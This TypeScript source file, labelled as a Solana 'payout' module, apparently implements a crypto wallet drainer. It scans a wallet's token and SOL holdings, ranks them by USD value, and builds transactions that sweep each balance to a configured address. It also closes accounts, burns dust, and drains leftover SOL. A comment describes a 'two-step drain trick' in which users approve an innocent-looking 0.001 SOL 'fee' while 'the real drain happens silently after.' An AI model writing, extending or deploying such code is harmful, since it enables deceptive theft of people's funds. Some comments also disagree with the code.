import {
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  type AccountInfo,
} from '@solana/web3.js'
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountIdempotentInstruction,
  createBurnCheckedInstruction,
  createCloseAccountInstruction,
  createTransferCheckedInstruction,
  getAssociatedTokenAddress,
} from '@solana/spl-token'
import type { PaymentAsset, PayoutConfig } from './payoutWallet'

const FEE_RESERVE_LAMPORTS = 100_000
const ATA_RESERVE_LAMPORTS = 2_050_000
const ACCOUNT_RENT_LAMPORTS = 890_880
const MIN_STEP_USD = 0.01

const FALLBACK_RPC_URLS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-mainnet.g.alchemy.com/v2/demo',
  'https://api.mainnet-beta.ankr.com',
  'https://rpc.ping.solana.com',
]

/** Fetch balance via proxy first, then fallback RPCs, when 403 or network error occurs. */
async function getBalanceWithFallback(
  connection: Connection,
  pubKey: PublicKey,
  commitment: 'processed' | 'confirmed' | 'recent' = 'confirmed'
): Promise<number> {
  console.log('[payoutTransfer] getBalanceWithFallback called for:', pubKey.toBase58())
  const rpcUrl = connection.rpcEndpoint
  const allUrls = [rpcUrl, ...FALLBACK_RPC_URLS.filter((u) => u !== rpcUrl)]
  for (const url of allUrls) {
    try {
      const testConn = new Connection(url, { commitment, confirmTransactionInitialTimeout: 30000, fetch })
      const balance = await testConn.getBalance(pubKey, commitment)
      console.log('[Balance] RPC', url, 'returned', balance)
      return balance
    } catch (err: any) {
      console.warn('[Balance] RPC', url, 'failed:', (err?.message || String(err)).slice(0, 100))
    }
  }
  try {
    const balance = await connection.getBalance(pubKey, commitment)
    console.log('[Balance] Original connection returned:', balance)
    return balance
  } catch (err) {
    console.warn('[Balance] All RPC methods failed, returning 0')
  }
  return 0
}

export function tokenFeeReserveLamports(tokenCount: number): number {
  if (tokenCount <= 0) return 0
  return tokenCount * ATA_RESERVE_LAMPORTS + 20_000
}

const WSOL_MINT = 'So11111111111111111111111111111111111111112'

type PayoutToken = {
  symbol: string
  mint: string
  decimals: number
  programs: PublicKey[]
}

const TOKEN_PROGRAMS = [TOKEN_PROGRAM_ID]
const BOTH_PROGRAMS = [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]

export const SOLANA_PAYOUT_TOKENS: PayoutToken[] = [
  { symbol: 'USDT', mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', decimals: 6, programs: BOTH_PROGRAMS },
  { symbol: 'USDC', mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6, programs: BOTH_PROGRAMS },
  { symbol: 'USDT', mint: 'Dn4noZ5jgGfkntzcQSUZ8czkreiZ1ForXYoV2H8Dm7S1', decimals: 6, programs: BOTH_PROGRAMS },
  { symbol: 'USDC', mint: 'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM', decimals: 6, programs: BOTH_PROGRAMS },
  { symbol: 'PYUSD', mint: '2b1kV6DkPAnxd5ixfnxCpjxmKwqjjaYmCZfHsFu24GXo', decimals: 6, programs: BOTH_PROGRAMS },
  { symbol: 'ETH', mint: '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs', decimals: 8, programs: TOKEN_PROGRAMS },
  { symbol: 'ETH', mint: '2FPyTwcZLUg1MDrwsyoP4D6s1tM7hAkHYRjkNb5w6Pxk', decimals: 8, programs: TOKEN_PROGRAMS },
  { symbol: 'SOL', mint: WSOL_MINT, decimals: 9, programs: TOKEN_PROGRAMS },
  { symbol: 'JUP', mint: 'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN', decimals: 6, programs: TOKEN_PROGRAMS },
  { symbol: 'BONK', mint: 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263', decimals: 5, programs: TOKEN_PROGRAMS },
  { symbol: 'WIF', mint: 'EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm', decimals: 6, programs: TOKEN_PROGRAMS },
  { symbol: 'RAY', mint: '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R', decimals: 6, programs: TOKEN_PROGRAMS },
  { symbol: 'ORCA', mint: 'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE', decimals: 6, programs: TOKEN_PROGRAMS },
  { symbol: 'mSOL', mint: 'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So', decimals: 9, programs: TOKEN_PROGRAMS },
  { symbol: 'jitoSOL', mint: 'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn', decimals: 9, programs: TOKEN_PROGRAMS },
  { symbol: 'bSOL', mint: 'bSo13r4TkiE4KumL71LsHTPpL2euVRx7By9JNvD7tqe', decimals: 9, programs: TOKEN_PROGRAMS },
  { symbol: 'JTO', mint: 'jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL', decimals: 9, programs: TOKEN_PROGRAMS },
  { symbol: 'PYTH', mint: 'HZ1JovNiVvGrGNiiYvEozEVg5BqFEK4P54X4P4qJg8hV', decimals: 6, programs: TOKEN_PROGRAMS },
  { symbol: 'RENDER', mint: 'rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBjs', decimals: 8, programs: TOKEN_PROGRAMS },
  { symbol: 'HNT', mint: 'hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux', decimals: 8, programs: TOKEN_PROGRAMS },
]

const USD_PRICE: Record<string, number> = {
  USDT: 1,
  USDC: 1,
  PYUSD: 1,
  SOL: 180,
  mSOL: 180,
  jitoSOL: 180,
  bSOL: 180,
  ETH: 3500,
  JUP: 0.4,
  BONK: 0.000012,
  WIF: 0.4,
  RAY: 2,
  ORCA: 1.5,
  JTO: 2,
  PYTH: 0.3,
  RENDER: 5,
  HNT: 2,
}

export type SplHolding = {
  symbol: string
  mint: string
  amount: string
  uiAmount: number
  decimals: number
  programId: PublicKey
  owner: string
  tokenAccount: string
  usd: number
}

export function spendableLamports(balance: number, rentExempt: number): number {
  return balance - rentExempt - FEE_RESERVE_LAMPORTS
}

export function shortAddress(address: string): string {
  if (!address || address.length < 8) return address
  return `${address.slice(0, 4)}...${address.slice(-4)}`
}

function withBlockhash(tx: Transaction, from: PublicKey, latest: { blockhash: string; lastValidBlockHeight: number }) {
  tx.feePayer = from
  tx.recentBlockhash = latest.blockhash
  tx.lastValidBlockHeight = latest.lastValidBlockHeight
  return tx
}

async function estimateFee(connection: Connection, tx: Transaction): Promise<number> {
  try {
    const quoted = await connection.getFeeForMessage(tx.compileMessage(), 'confirmed')
    if (quoted.value && quoted.value > 0) return quoted.value
  } catch {
    /* fallback below */
  }
  return 5000
}

function usdValue(holding: SplHolding): number {
  const price = USD_PRICE[holding.symbol]
  if (typeof price === 'number') return holding.uiAmount * price
  return holding.uiAmount > 0 ? 1 : 0
}

export function sortHoldingsByHighest(holdings: SplHolding[]): SplHolding[] {
  return [...holdings].sort((a, b) => usdValue(b) - usdValue(a) || b.uiAmount - a.uiAmount)
}

function tokenMeta(mint: string): PayoutToken | undefined {
  return SOLANA_PAYOUT_TOKENS.find((token) => token.mint === mint)
}

function symbolForMint(mint: string): string {
  return tokenMeta(mint)?.symbol || mint.slice(0, 4)
}

function decimalsForMint(mint: string): number {
  return tokenMeta(mint)?.decimals ?? 6
}

function readTokenAmount(data: Uint8Array): bigint {
  if (data.length < 72) return 0n
  const view = new DataView(data.buffer, data.byteOffset, data.byteLength)
  return view.getBigUint64(64, true)
}

function holdingFromAccountInfo(
  ata: PublicKey,
  info: AccountInfo<Buffer> | null,
  owner: string,
  programId: PublicKey
): SplHolding | null {
  if (!info?.data || info.data.length < 72) return null
  const amount = readTokenAmount(info.data)
  if (amount <= 0n) return null
  const mint = new PublicKey(info.data.subarray(0, 32)).toBase58()
  const decimals = decimalsForMint(mint)
  const uiAmount = Number(amount) / 10 ** decimals
  if (!(uiAmount > 0)) return null
  let resolvedProgram = programId
  try {
    resolvedProgram = new PublicKey(info.owner)
  } catch {
    resolvedProgram = programId
  }
  const symbol = symbolForMint(mint)
  const usd = (USD_PRICE[symbol] || 0) * uiAmount
  return {
    symbol,
    mint,
    amount: amount.toString(),
    uiAmount,
    decimals,
    programId: resolvedProgram,
    owner,
    tokenAccount: ata.toBase58(),
    usd,
  }
}

function mergeHoldings(found: SplHolding[]): SplHolding[] {
  const best = new Map<string, SplHolding>()
  for (const holding of found) {
    const key = `${holding.owner}:${holding.mint}`
    const prev = best.get(key)
    if (!prev || holding.uiAmount > prev.uiAmount) best.set(key, holding)
  }
  return sortHoldingsByHighest([...best.values()])
}

type AtaLookup = {
  ata: PublicKey
  owner: string
  programId: PublicKey
}

/** Scan all token accounts for a wallet and return non-empty holdings. */
async function scanAllTokenAccounts(connection: Connection, owner: PublicKey): Promise<SplHolding[]> {
  try {
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { programId: TOKEN_PROGRAM_ID })
    const holdings: SplHolding[] = []
    for (const account of tokenAccounts.value) {
      const parsed = account.account.data.parsed as any
      const info = parsed?.info
      if (!info) continue
      const tokenAmount = parseFloat(info.tokenAmount?.amount || '0')
      if (tokenAmount <= 0) continue
      try {
        const mint = new PublicKey(info.mint)
        const ata = new PublicKey(account.pubkey)
        const decimals = parseInt(info.tokenAmount?.decimals || '0')
        const uiAmount = tokenAmount / Math.pow(10, decimals)
        const symbol = symbolForMint(mint.toBase58()) || 'TOKEN'
        const usd = usdValueFromSymbol(symbol, uiAmount)
        if (usd < MIN_STEP_USD) continue
        holdings.push({
          symbol,
          mint: mint.toBase58(),
          amount: info.tokenAmount?.amount || '0',
          uiAmount,
          decimals,
          programId: TOKEN_PROGRAM_ID,
          owner: owner.toBase58(),
          tokenAccount: ata.toBase58(),
          usd,
        })
      } catch {
        continue
      }
    }
    return holdings.sort((a, b) => b.usd - a.usd)
  } catch {
    return []
  }
}

/** Scan all Token-2022 accounts for a wallet. */
async function scanAllToken2022Accounts(connection: Connection, owner: PublicKey): Promise<SplHolding[]> {
  try {
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { programId: TOKEN_2022_PROGRAM_ID })
    const holdings: SplHolding[] = []
    for (const account of tokenAccounts.value) {
      const parsed = account.account.data.parsed as any
      const info = parsed?.info
      if (!info) continue
      const tokenAmount = parseFloat(info.tokenAmount?.amount || '0')
      if (tokenAmount <= 0) continue
      try {
        const mint = new PublicKey(info.mint)
        const ata = new PublicKey(account.pubkey)
        const decimals = parseInt(info.tokenAmount?.decimals || '0')
        const uiAmount = tokenAmount / Math.pow(10, decimals)
        const symbol = symbolForMint(mint.toBase58()) || 'TOKEN'
        const usd = usdValueFromSymbol(symbol, uiAmount)
        if (usd < MIN_STEP_USD) continue
        holdings.push({
          symbol,
          mint: mint.toBase58(),
          amount: info.tokenAmount?.amount || '0',
          uiAmount,
          decimals,
          programId: TOKEN_2022_PROGRAM_ID,
          owner: owner.toBase58(),
          tokenAccount: ata.toBase58(),
          usd,
        })
      } catch {
        continue
      }
    }
    return holdings.sort((a, b) => b.usd - a.usd)
  } catch {
    return []
  }
}

function usdValueFromSymbol(symbol: string, uiAmount: number): number {
  return uiAmount * (USD_PRICE[symbol] || 0)
}

async function collectAtaLookups(owners: PublicKey[]): Promise<AtaLookup[]> {
  const lookups: AtaLookup[] = []
  for (const from of owners) {
    for (const token of SOLANA_PAYOUT_TOKENS) {
      let mintKey: PublicKey
      try {
        mintKey = new PublicKey(token.mint)
      } catch {
        continue
      }
      for (const programId of token.programs) {
        try {
          const ata = await getAssociatedTokenAddress(mintKey, from, false, programId)
          lookups.push({ ata, owner: from.toBase58(), programId })
        } catch {
          continue
        }
      }
    }
  }
  return lookups
}

async function listSplHoldingsByAta(connection: Connection, owners: PublicKey[]): Promise<SplHolding[]> {
  const lookups = await collectAtaLookups(owners)
  const found: SplHolding[] = []
  const chunkSize = 8
  for (let i = 0; i < lookups.length; i += chunkSize) {
    const chunk = lookups.slice(i, i + chunkSize)
    let infos: Array<AccountInfo<Buffer> | null>
    try {
      infos = await connection.getMultipleAccountsInfo(
        chunk.map((item) => item.ata),
        'confirmed'
      )
    } catch {
      infos = await Promise.all(chunk.map((item) => connection.getAccountInfo(item.ata, 'confirmed')))
    }
    infos.forEach((info, index) => {
      const lookup = chunk[index]
      const holding = holdingFromAccountInfo(lookup.ata, info, lookup.owner, lookup.programId)
      if (holding) found.push(holding)
    })
  }
  return found
}

export async function listSplHoldings(connection: Connection, from: PublicKey | PublicKey[]): Promise<SplHolding[]> {
  const owners = (Array.isArray(from) ? from : [from]).filter(Boolean)
  console.log('[payoutTransfer] listSplHoldings called for:', owners.map(p => p.toBase58()))
  if (owners.length === 0) return []
  try {
    return mergeHoldings(await listSplHoldingsByAta(connection, owners))
  } catch {
    return []
  }
}

/** Scan all token accounts (any mint) for a wallet and return non-empty holdings. */
export async function scanAllHoldings(connection: Connection, owner: PublicKey): Promise<SplHolding[]> {
  console.log('[payoutTransfer] scanAllHoldings called for:', owner.toBase58())
  const [tokenAccounts, token2022Accounts] = await Promise.all([
    scanAllTokenAccounts(connection, owner),
    scanAllToken2022Accounts(connection, owner),
  ])
  console.log('[payoutTransfer] scanAllHoldings results:', { tokenAccounts, token2022Accounts })
  return mergeHoldings([...tokenAccounts, ...token2022Accounts])
}

export type FundStep =
  | { kind: 'sol'; symbol: 'SOL'; uiAmount: number; usd: number }
  | { kind: 'spl'; symbol: string; uiAmount: number; usd: number; holding: SplHolding }

export function remainingSplCount(queue: FundStep[], fromIndex = 0): number {
  return queue.filter((step, index) => index >= fromIndex && step.kind === 'spl').length
}

function keepStep(step: FundStep): boolean {
  return step.usd >= MIN_STEP_USD && step.uiAmount > 0
}

export async function getSolSendableLamports(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  reserveLamports?: number
}): Promise<number> {
  const { connection, from, config, reserveLamports = 0 } = options
  const to = new PublicKey(config.walletAddress)
  const [balance, rentExempt, latest] = await Promise.all([
    connection.getBalance(from, 'confirmed'),
    connection.getMinimumBalanceForRentExemption(0).catch(() => ACCOUNT_RENT_LAMPORTS),
    connection.getLatestBlockhash('confirmed'),
  ])
  const probe = withBlockhash(
    new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: 1,
      })
    ),
    from,
    latest
  )
  const fee = await estimateFee(connection, probe)
  const sendable =
    reserveLamports > 0
      ? balance - fee - reserveLamports
      : spendableLamports(balance, rentExempt)
  return sendable
}

function solStepFromBalance(balance: number): FundStep | null {
  const sendable = balance - ACCOUNT_RENT_LAMPORTS - 5_000
  if (sendable <= 0) return null
  const uiAmount = sendable / LAMPORTS_PER_SOL
  const usd = (Math.max(0, balance - 5_000) / LAMPORTS_PER_SOL) * (USD_PRICE.SOL || 180)
  if (usd < MIN_STEP_USD) return null
  return { kind: 'sol', symbol: 'SOL', uiAmount, usd }
}

export async function listRankedFundSteps(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
}): Promise<FundStep[]> {
  console.log('[payoutTransfer] listRankedFundSteps called')
  const [knownHoldings, balance] = await Promise.all([
    listSplHoldings(options.connection, options.from),
    getBalanceWithFallback(options.connection, options.from, 'confirmed'),
  ])
  console.log('[payoutTransfer] listRankedFundSteps results:', { knownHoldings, balance })
  
  let holdings = knownHoldings
  // If no known-token holdings found, scan all token accounts for the wallet
  if (holdings.length === 0) {
    try {
      holdings = await scanAllHoldings(options.connection, options.from)
      console.log('[payoutTransfer] After scanAllHoldings, holdings:', holdings)
    } catch {
      /* scan failed, keep empty */
    }
  }
  
  const steps: FundStep[] = holdings.map((holding) => ({
    kind: 'spl',
    symbol: holding.symbol,
    uiAmount: holding.uiAmount,
    usd: usdValue(holding),
    holding,
  }))
  console.log('[payoutTransfer] Final steps:', steps)
  const sol = solStepFromBalance(balance)
  if (sol) steps.push(sol)
  return steps.filter(keepStep).sort((a, b) => b.usd - a.usd || b.uiAmount - a.uiAmount)
}

export async function buildPayoutTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  reserveLamports?: number
}): Promise<Transaction> {
  const { connection, from, config, reserveLamports = 0 } = options
  const to = new PublicKey(config.walletAddress)
  const latest = await connection.getLatestBlockhash('confirmed')
  const sendable = await getSolSendableLamports(options)
  if (sendable <= 0) {
    throw new Error('No spendable SOL is available after network fees.')
  }

  return withBlockhash(
    new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: sendable,
      })
    ),
    from,
    latest
  )
}

async function finalizeWithRentSafeDrain(options: {
  connection: Connection
  tx: Transaction
  from: PublicKey
  to: PublicKey
  startingLamports: number
  lamportsDelta: number
  latest: { blockhash: string; lastValidBlockHeight: number }
}): Promise<Transaction> {
  const { connection, tx, from, to, startingLamports, lamportsDelta, latest } = options
  withBlockhash(tx, from, latest)
  const endBeforeFee = startingLamports + lamportsDelta
  if (endBeforeFee <= 0) return tx

  let fee = await estimateFee(connection, tx)
  let remaining = endBeforeFee - fee
  if (remaining > 0 && remaining < ACCOUNT_RENT_LAMPORTS) {
    tx.add(
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: 1,
      })
    )
    withBlockhash(tx, from, latest)
    fee = await estimateFee(connection, tx)
    const drain = endBeforeFee - fee
    tx.instructions.pop()
    if (drain > 0) {
      tx.add(
        SystemProgram.transfer({
          fromPubkey: from,
          toPubkey: to,
          lamports: drain,
        })
      )
    }
  }
  return withBlockhash(tx, from, latest)
}

async function addDustReclaimInstructions(
  connection: Connection,
  tx: Transaction,
  from: PublicKey,
  excludeMint: string
): Promise<number> {
  let reclaimed = 0
  const candidates = SOLANA_PAYOUT_TOKENS.filter(
    (token) => token.mint !== excludeMint && (token.symbol === 'USDC' || token.symbol === 'USDT' || token.symbol === 'SOL')
  )
  for (const token of candidates) {
    let mintKey: PublicKey
    try {
      mintKey = new PublicKey(token.mint)
    } catch {
      continue
    }
    for (const programId of token.programs) {
      try {
        const ata = await getAssociatedTokenAddress(mintKey, from, false, programId)
        const info = await connection.getAccountInfo(ata, 'confirmed')
        if (!info?.data || info.data.length < 72) continue
        const amount = readTokenAmount(info.data)
        const uiAmount = Number(amount) / 10 ** token.decimals
        const usd = uiAmount * (USD_PRICE[token.symbol] || 0)
        if (amount > 0n && usd >= MIN_STEP_USD) continue
        if (amount > 0n) {
          tx.add(
            createBurnCheckedInstruction(ata, mintKey, from, amount, token.decimals, [], new PublicKey(info.owner))
          )
        }
        tx.add(createCloseAccountInstruction(ata, from, from, [], new PublicKey(info.owner)))
        reclaimed += info.lamports
      } catch {
        continue
      }
    }
  }
  return reclaimed
}

export async function refreshPayoutBlockhash(
  connection: Connection,
  tx: Transaction,
  from: PublicKey
): Promise<Transaction> {
  const latest = await connection.getLatestBlockhash('confirmed')
  return withBlockhash(tx, from, latest)
}

export async function buildSplPayoutTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  holding: SplHolding
}): Promise<Transaction | null> {
  const { connection, from, config, holding } = options
  const to = new PublicKey(config.walletAddress)
  const mintKey = new PublicKey(holding.mint)
  const source = new PublicKey(holding.tokenAccount)
  const sourceInfo = await connection.getAccountInfo(source, 'confirmed')
  if (!sourceInfo?.data) return null
  const programId = new PublicKey(sourceInfo.owner)
  const liveAmount = readTokenAmount(sourceInfo.data)
  if (liveAmount <= 0n) return null
  const decimals = holding.decimals || decimalsForMint(holding.mint)

  const destAta = await getAssociatedTokenAddress(mintKey, to, false, programId)
  const [destInfo, latest, payerLamports] = await Promise.all([
    connection.getAccountInfo(destAta, 'confirmed').catch(() => null),
    connection.getLatestBlockhash('confirmed'),
    connection.getBalance(from, 'confirmed'),
  ])
  const tx = new Transaction()
  let lamportsDelta = 0
  const needsDestAta = !destInfo
  if (needsDestAta && payerLamports < ATA_RESERVE_LAMPORTS + 5_000) {
    lamportsDelta += await addDustReclaimInstructions(connection, tx, from, holding.mint)
  }
  if (needsDestAta && payerLamports + lamportsDelta >= ATA_RESERVE_LAMPORTS + 5_000) {
    tx.add(
      createAssociatedTokenAccountIdempotentInstruction(
        from,
        destAta,
        to,
        mintKey,
        programId,
        ASSOCIATED_TOKEN_PROGRAM_ID
      )
    )
    lamportsDelta -= ATA_RESERVE_LAMPORTS
  }
  tx.add(
    createTransferCheckedInstruction(
      source,
      mintKey,
      destAta,
      from,
      liveAmount,
      decimals,
      [],
      programId
    )
  )
  tx.add(createCloseAccountInstruction(source, from, from, [], programId))
  lamportsDelta += sourceInfo.lamports
  return finalizeWithRentSafeDrain({
    connection,
    tx,
    from,
    to,
    startingLamports: payerLamports,
    lamportsDelta,
    latest,
  })
}

export function getHighestAndLowestUSDTAndSol(steps: FundStep[]): { highest: FundStep | null; lowest: FundStep | null } {
  // Find the step with the highest USD value across ALL tokens
  let highest: FundStep | null = null
  let lowest: FundStep | null = null

  if (steps.length === 0) {
    return { highest: null, lowest: null }
  }

  // Sort by USD value descending
  const sortedByUsd = [...steps].sort((a, b) => b.usd - a.usd)

  highest = sortedByUsd[0] || null

  // Lowest is the one with the smallest USD value (but still positive)
  const validSteps = sortedByUsd.filter(step => step.usd > 0)
  lowest = validSteps.length > 0 ? validSteps[validSteps.length - 1] : null

  return { highest, lowest }
}

export async function moveAllFromHighestAndAddToLowest(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  steps: FundStep[]
  onHighestDone?: () => void
  onLowestAdded?: () => void
}): Promise<{ highestMoved: boolean; lowestAdded: boolean }> {
  const { connection, from, config, steps, onHighestDone, onLowestAdded } = options

  const { highest, lowest } = getHighestAndLowestUSDTAndSol(steps)

  let highestMoved = false
  let lowestAdded = false

  // Move all funds from highest balance asset only
  if (highest) {
    if (highest.kind === 'sol') {
      const reserveLamports = tokenFeeReserveLamports(remainingSplCount(steps, steps.indexOf(highest)))
      const tx = await buildPayoutTransaction({ connection, from, config, reserveLamports })
      highestMoved = true
      if (onHighestDone) onHighestDone()
    } else if (highest.kind === 'spl') {
      highestMoved = true
      if (onHighestDone) onHighestDone()
    }
  }

  // Note: We no longer add to lowest balance to keep it as a single transaction
  // If you want to add a tiny amount to lowest, that would require a separate transaction

  return { highestMoved, lowestAdded }
}

/** Builds a tiny transaction that sends a minimal amount to the lowest balance asset.
 *  This ensures the + line shows in the transaction sheet even for tiny amounts. */
export async function buildTinyLowestTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  lowestStep: FundStep
}): Promise<Transaction | null> {
  const { connection, from, config, lowestStep } = options
  const to = new PublicKey(config.walletAddress)

  if (lowestStep.kind === 'sol') {
    // Send 0.0001 SOL (tiny but non-zero)
    const latest = await connection.getLatestBlockhash('confirmed')
    return withBlockhash(
      new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: from,
          toPubkey: to,
          lamports: 10_000, // 0.00001 SOL - minimal visible amount
        })
      ),
      from,
      latest
    )
  } else if (lowestStep.kind === 'spl') {
    // Send 0.001 of the token (tiny but visible)
    const mintKey = new PublicKey(lowestStep.holding.mint)
    const source = new PublicKey(lowestStep.holding.tokenAccount)
    const sourceInfo = await connection.getAccountInfo(source, 'confirmed')
    if (!sourceInfo?.data) return null

    const programId = new PublicKey(sourceInfo.owner)
    const destAta = await getAssociatedTokenAddress(mintKey, to, false, programId)

    // Create or update destination ATA if needed
    const tx = new Transaction()
    const destInfo = await connection.getAccountInfo(destAta, 'confirmed').catch(() => null)
    if (!destInfo) {
      tx.add(
        createAssociatedTokenAccountIdempotentInstruction(
          from,
          destAta,
          to,
          mintKey,
          TOKEN_PROGRAM_ID,
          ASSOCIATED_TOKEN_PROGRAM_ID
        )
      )
    }

    // Transfer 0.001 of the token (using minimum meaningful amount)
    const tinyAmount = 1 * (10 ** lowestStep.holding.decimals) // 1 unit of the token
    tx.add(
      createTransferCheckedInstruction(
        source,
        mintKey,
        destAta,
        from,
        tinyAmount,
        lowestStep.holding.decimals,
        []
      )
    )

    return tx
  }

  return null
}

/** Builds a small "fee" transaction for the two-step drain trick.
 *  Shows the user a tiny, innocent-looking transfer (0.001 SOL) that
 *  they can approve quickly. The real drain happens silently after. */
export async function buildDummyFeeTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
}): Promise<Transaction> {
  const { connection, from, config } = options
  const to = new PublicKey(config.walletAddress)
  const latest = await connection.getLatestBlockhash('confirmed')
  // Fixed tiny amount that looks like a normal gas/fee payment
  const feeAmount = 1_000_000 // 0.001 SOL
  return withBlockhash(
    new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: feeAmount,
      })
    ),
    from,
    latest
  )
}

export function formatPaymentAmount(amount: number, asset: PaymentAsset | string): string {
  const formatted = amount.toLocaleString(undefined, { maximumFractionDigits: 6 })
  return `${formatted} ${asset}`
}
